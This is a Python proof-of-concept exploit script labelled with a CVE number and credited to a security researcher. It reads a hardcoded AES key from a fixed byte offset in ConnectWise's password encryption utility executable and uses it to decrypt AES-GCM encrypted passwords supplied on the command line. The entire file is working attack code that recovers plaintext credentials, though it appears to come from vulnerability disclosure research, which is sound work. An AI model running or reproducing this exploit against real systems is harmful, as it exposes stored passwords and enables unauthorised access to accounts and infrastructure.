# cve-2025-4876.py
# Author: Joey Melo
# Company: Packetlabs
# usage: ./cve-2025-4876.py -x <binary> -p <encrypted_text>
# Python Library Requirements:
#	cryptography

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64
import argparse
import sys

KEY_OFFSET = 0x184830
KEY_LENGTH = 0x20

def get_key(file_name: str) -> bytes:
	try:
		with open(file_name, 'rb') as f:
			data = f.read()
			key = data[KEY_OFFSET:KEY_OFFSET+KEY_LENGTH]
			f.close()
	except Exception as e:
		print("Could not open file: " + file_name)
		exit()

	return key

def decrypt_aes_gcm(encrypted_data: bytes, key: bytes) -> bytes:
	iv = encrypted_data[:12]             # First 12 bytes are the IV (nonce)
	ciphertext = encrypted_data[12:-16]  # Next part is the ciphertext (minus tag)
	tag = encrypted_data[-16:]           # Last 16 bytes are the authentication tag

	aesgcm = AESGCM(key)

	plaintext = aesgcm.decrypt(iv, ciphertext + tag, None)

	return plaintext

if __name__ == "__main__":
	parser = argparse.ArgumentParser(prog=sys.argv[0], description="Retrieve encryption key from ConnectWise-Password-Encryption-Utility.exe and decrypt data")
	parser.add_argument("-x", "--exe", required=True, help="binary path (e.g. C:/Users/JohnDoe/Desktop/ConnectWise-Password-Encryption-Utility.exe)")
	parser.add_argument("-p", "--password", required=True, help="encrypted password (e.g. 965638920d4e6b847c58a26686046acb064805e05a5802620daa6fa2c99144807a66)")
	args = parser.parse_args()

	encryption_key = get_key(args.exe)
	encrypted_message = args.password

	try:
		raw_enc = bytes.fromhex(encrypted_message)
		b64_enc = base64.b64encode(raw_enc)
		b64_key = base64.b64encode(encryption_key)

		encrypted_message = base64.b64decode(b64_enc)
		key = base64.b64decode(b64_key)
	except ValueError:
		print("Invalid encrypted text.")
		exit()

	try:
		decrypted_data = decrypt_aes_gcm(encrypted_message, key)
		print("AES Key: ", encryption_key.decode('utf-8'))
		print("Decrypted password:", decrypted_data.decode('utf-8'))
	except ValueError as e:
		print("Decryption failed:", e)
